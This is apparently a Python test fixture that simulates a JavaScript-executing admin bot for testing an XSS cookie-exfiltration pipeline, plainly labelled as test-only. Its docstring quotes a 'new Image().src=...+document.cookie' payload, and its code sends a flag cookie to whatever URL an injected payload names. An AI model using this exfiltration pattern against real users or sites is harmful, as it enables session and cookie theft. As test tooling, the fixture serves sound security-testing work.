"""Admin-bot XSS exfil fixture. TEST FIXTURE ONLY.

Simulates a JS-executing headless bot *without* a real browser: on ``/report`` it
parses the exfil URL out of the reported page's payload and calls it with the
bot's flag cookie appended — exactly what a real browser running the injected
``new Image().src=...+document.cookie`` would do. This lets the capture/exfil
pipeline be tested deterministically and cross-platform.
"""
from __future__ import annotations

import re
import threading
import urllib.request
from urllib.parse import parse_qs, quote, urlsplit

from .wsgi_common import first, form, query, respond

_SRC = re.compile(r"""src=['"]?(https?://[^'"+ )]+)""")


def make_app(flag: str = "flag{exfil_demo}"):
    def app(environ, start_response):
        path = environ.get("PATH_INFO", "/")
        method = environ["REQUEST_METHOD"]
        data = query(environ)
        if method == "POST":
            data.update(form(environ))
        if path == "/report" and method == "POST":
            url = first(data, "url")
            threading.Thread(target=_visit, args=(url, flag), daemon=True).start()
            return respond(start_response, '{"visited":true}', ctype="application/json")
        return respond(start_response, "<html><body>home</body></html>")
    return app


def _visit(visit_url: str, flag: str) -> None:
    """The 'browser': find the payload's exfil URL and fire it with the cookie."""
    payload = (parse_qs(urlsplit(visit_url).query).get("html_input") or [""])[0]
    m = _SRC.search(payload)
    if not m:
        return
    exfil = m.group(1).rstrip("?")
    try:
        urllib.request.urlopen(exfil + "?c=" + quote("flag=" + flag), timeout=5)
    except Exception:
        pass
